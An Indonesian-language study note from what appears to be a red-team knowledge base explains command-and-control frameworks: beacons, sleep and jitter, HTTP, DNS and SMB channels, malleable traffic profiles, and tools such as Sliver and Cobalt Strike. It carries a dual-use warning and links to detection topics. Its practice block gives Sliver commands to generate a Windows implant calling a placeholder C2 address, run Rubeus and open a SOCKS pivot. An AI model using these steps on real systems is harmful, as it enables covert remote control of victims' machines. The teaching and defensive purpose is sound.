# 📡 C2 Frameworks (Command & Control)

> [!summary] Ringkasan
> Setelah dapat akses awal, penyerang butuh cara **mengendalikan mesin korban dari jarak jauh** secara andal & tersembunyi — itulah **C2 (Command & Control)**. Sebuah **agent/implant** berjalan di korban dan "menelepon pulang" (**beacon**) ke **server C2** milik penyerang untuk menerima perintah & mengirim hasil. Note ini membahas arsitektur C2, konsep **beacon/sleep/jitter**, channel komunikasi (HTTP/S, DNS, SMB), **malleable profile** (menyamarkan trafik), dan framework populer (Cobalt Strike, Sliver, Mythic, Havoc).

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Post-Exploitation & Pivoting]], [[Exploitation & Metasploit]]

---

> [!danger] Dual-use
> C2 framework adalah alat sah pentest/red team, tapi juga dipakai penjahat. Gunakan **hanya** di engagement berizin/lab. Memetakan ke [[Cyber Kill Chain & MITRE ATT&CK|ATT&CK]] taktik **Command & Control (TA0011)**.

## 🧠 Konsep Inti

### Arsitektur dasar
```text
[Korban: agent/implant] --beacon--> [Redirector] --> [Team Server C2] <-- [Operator]
```
- **Agent/Implant/Beacon** — kode di korban yang menjalankan perintah.
- **Listener** — port/protokol tempat C2 menerima koneksi agent.
- **Team Server** — server pusat operator mengetik perintah.
- **Redirector** — perantara (lihat [[Red Team Infrastructure & OPSEC]]) agar IP server asli tersembunyi.

### Beacon: sleep & jitter
Implant tidak konek terus-menerus (mudah terdeteksi). Ia **tidur** lalu bangun berkala untuk cek perintah:
- **Sleep** — interval tidur (mis. 60 detik).
- **Jitter** — variasi acak pada interval (mis. ±30%) agar pola tak teratur → mengelabui deteksi **beaconing** ([[Network Security Lanjutan (NSM-NDR)]]).

### Channel komunikasi
| Channel | Karakter |
|---|---|
| **HTTP/HTTPS** | paling umum, membaur dengan web; bisa pakai domain fronting/CDN |
| **DNS** | lambat tapi lolos firewall ketat; via query TXT/A |
| **SMB / named pipe** | C2 peer-to-peer internal (host tanpa internet → relay lewat host lain) |
| **TCP mentah** | langsung, untuk pivot internal |

### Malleable C2 Profile
Aturan yang membentuk **tampilan trafik** beacon agar meniru layanan sah (mis. menyaru sebagai update Microsoft/jQuery CDN). Header, URI, User-Agent semua bisa dipalsukan → mempersulit deteksi signature.

### Fitur operasi yang lazim
- **Lateral movement** terintegrasi (psexec, WMI, SSH).
- **Pivoting / SOCKS proxy** (→ [[Pivoting & Tunneling Lanjutan]]).
- **BOF (Beacon Object Files)** / post-ex modules in-memory (minim jejak → [[AV-EDR Evasion & AV Bypass]]).
- **Token manipulation, credential dumping, screenshot, keylog**.

## ⚙️ Praktik

```bash
# Sliver (open-source, gratis — bagus untuk belajar)
sliver
> generate --http <ip-c2> --os windows --save /tmp     # buat implant
> http                                                  # jalankan listener HTTP
# (jalankan implant di korban) lalu:
> sessions                                              # lihat agent yang masuk
> use <id>
> ps ; ls ; execute-assembly Rubeus.exe                 # jalankan perintah
> socks5 start                                          # pivot SOCKS
```

```text
# Framework lain:
#  - Cobalt Strike : standar industri (komersial); Beacon + Malleable profile + Aggressor
#  - Mythic        : multi-agent, web UI, modular (Apollo/Medusa/dll.)
#  - Havoc         : open-source modern, demon agent, evasion bawaan
#  - Metasploit    : Meterpreter (lihat [[Exploitation & Metasploit]]) — C2 dasar
```

## 🧰 Tools

- **Sliver** — C2 open-source serbaguna (Go), mudah dipelajari.
- **Cobalt Strike** — komersial, de-facto standard red team.
- **Mythic** — framework C2 modular berbasis Docker.
- **Havoc** — C2 open-source dengan fokus evasion.
- **Metasploit / Meterpreter** — C2 entry-level.

## 🔗 Kaitan

- Akses awal yang dikendalikan: [[Payload Development & Initial Access]] (stager/loader memuat implant).
- Implant disembunyikan dgn: [[AV-EDR Evasion & AV Bypass]].
- Infrastruktur server & redirector: [[Red Team Infrastructure & OPSEC]].
- Setelah C2 hidup: [[Post-Exploitation & Pivoting]] · [[Pivoting & Tunneling Lanjutan]] · [[Active Directory Attacks]].
- **Sisi Blue ↔** [[Network Security Lanjutan (NSM-NDR)]] (deteksi beaconing/JA3), [[Threat Hunting]], [[Endpoint Security & EDR]].
- Emulasi C2 aktor nyata: [[Purple Team Lanjutan (Adversary Emulation)]].

## 🎯 Latihan

- Pasang **Sliver** di lab, hasilkan implant HTTP, jalankan di VM Windows, dan dapatkan session. Atur **sleep 5 jitter 50%**.
- Jalankan **SOCKS proxy** lewat implant lalu akses host internal (lihat [[Pivoting & Tunneling Lanjutan]]).
- **Mode Blue:** tangkap trafik beacon di Wireshark, amati pola interval → cocokkan dengan deteksi beaconing di [[Network Security Lanjutan (NSM-NDR)]].

## 📖 Sumber

- **MITRE ATT&CK — Command & Control (TA0011)**.
- **Sliver wiki** — https://github.com/BishopFox/sliver/wiki
- **Cobalt Strike — Malleable C2 docs**.
- **The C2 Matrix** — https://www.thec2matrix.com
